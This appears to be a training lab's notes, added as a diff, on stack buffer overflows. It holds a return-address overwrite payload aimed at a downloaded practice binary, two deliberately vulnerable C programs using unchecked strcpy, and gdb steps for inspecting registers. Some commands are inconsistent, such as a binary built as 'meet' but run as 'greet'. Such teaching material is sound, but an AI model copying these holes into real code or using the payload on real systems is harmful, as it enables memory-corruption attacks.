@@ -1,0 +1,67 @@
+wget https://github.com/DemonRevoked/WhizCombat/raw/main/bufferoverflow/buffer.out
+
+sudo chmod +x buffer.out
+
+python3 -c 'print("A"*20)' | ./buffer.out
+
+objdump -d buffer.out
+
+objdump -d buffer.out  | grep 401176
+
+python3 -c 'print("A"*40+"\x76\x11\x40")' | ./buffer.out
+
+----------------------------------------------------------------------------------------------
+overflow.c
+**************
+main()
+{
+ char str[10];
+ strcpy(str,'AAAAAAAAAAAAAAAAAAAAAAAAAA');
+ 
+}
+
+************
+
+gcc -ggdb -o overflow overflow.c
+gdb -q overflow
+run
+   info reg rip
+	 q
+ 
+
+----------------------------------------------------------------------------------------
+
+greet.c
+*****************************************
+#include <stdio.h>
+#include <string.h>  // Include for strcpy
+
+void greeting (char *temp1, char *temp2) { // Now returns void
+    char name [400];
+
+    strcpy(name, temp2);
+    printf("Hello %s %s\n", temp1, name);
+}
+
+int main(int argc, char * argv[]) { // Now returns int
+    greeting (argv[1], argv[2]);
+    printf("Bye %s %s\n", argv[1], argv[2]);
+
+    return 0; // Indicate successful execution (important for main)
+}
+
+***********************************************
+
+gcc -o meet -ggdb greet.c
+./greet Mr `perl -e 'print "A" x 10'`
+./greet Mr `perl -e 'print "A" x 600'`
+gdb -q meet
+    info reg rip
+    info reg rbp
+    list
+    b 6
+    ./greet Mr `perl -e 'print "A" x 600'`
+    d 1
+   ./greet Mr `perl -e 'print "A" x 401'`
+   info reg rip rbp
+
